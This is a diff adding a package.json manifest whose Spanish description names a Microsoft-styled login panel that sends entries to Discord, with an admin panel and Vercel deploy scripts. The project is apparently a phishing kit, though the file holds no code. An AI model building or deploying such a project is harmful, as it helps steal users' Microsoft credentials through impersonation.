@@ -1,0 +1,13 @@
+{
+  "name": "mail-office-3656",
+  "version": "1.0.0",
+  "type": "module",
+  "description": "Panel de login con estilo Microsoft, envío a Discord y panel de administración",
+  "scripts": {
+    "dev": "vercel dev",
+    "deploy": "vercel --prod --force"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "MIT"
+}
